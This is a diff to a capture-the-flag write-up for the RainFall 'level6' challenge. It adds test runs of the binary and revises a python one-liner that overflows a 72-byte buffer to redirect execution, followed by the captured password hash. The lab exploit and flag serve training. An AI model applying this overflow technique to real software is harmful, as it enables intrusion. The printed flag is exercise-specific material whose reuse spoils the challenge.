@@ -1,5 +1,12 @@
 _basic binary testing_
 ```
+level6@RainFall:~$ ls
+level6
+level6@RainFall:~$ ./level6 
+Segmentation fault (core dumped)
+level6@RainFall:~$ ./level6 test
+Nope
+
 ```
 
 _using gdb_
@@ -112,6 +119,9 @@ _to find the size of the buffer, we will creat a script python that fill the buf
 
 _now we can use the buffer overflow to get the password_
 ```
-  $> ./level6 `python -c 'print "0" * 72 + "\x08\x04\x84\x54"[::-1]'`
+  $> ./level6 `python -c 'print "0" * 72 + "\x54\x84\x04\x08"'`
+
   f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
+
+>**DONE**
